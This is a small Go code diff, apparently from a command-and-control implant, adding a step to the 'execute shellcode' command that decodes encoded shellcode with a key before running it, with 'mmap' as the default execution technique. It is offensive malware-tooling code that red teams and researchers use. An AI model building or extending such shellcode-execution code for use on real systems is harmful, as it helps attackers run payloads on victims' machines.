@@ -46,6 +46,13 @@ func (c *ExecuteShellcodeCommand) Execute(task structs.Task) structs.CommandResu
 		return errorResult("Error: shellcode is empty after decoding")
 	}
 
+	if args.Encoding != "" && args.Encoding != "none" {
+		shellcode, err = decodeShellcode(shellcode, args.Encoding, args.Key)
+		if err != nil {
+			return errorf("Error decoding shellcode (%s): %v", args.Encoding, err)
+		}
+	}
+
 	technique := strings.ToLower(args.Technique)
 	if technique == "" {
 		technique = "mmap"
